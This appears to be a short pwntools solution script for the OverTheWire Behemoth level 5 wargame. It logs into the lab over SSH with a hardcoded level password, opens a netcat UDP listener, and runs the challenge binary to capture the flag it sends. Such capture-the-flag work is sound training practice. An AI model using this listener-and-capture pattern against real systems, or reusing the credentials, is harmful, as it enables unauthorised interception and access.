from pwn import *


'''
Here, we have a binary that will send the flag in udp server
'''
con = ssh('behemoth5', 'behemoth.labs.overthewire.org', password='aizeeshing', port=2221)
p = con.process(['nc', '-lup', '1337'])
p2 = con.process('/behemoth/behemoth5')
print(p.recv())
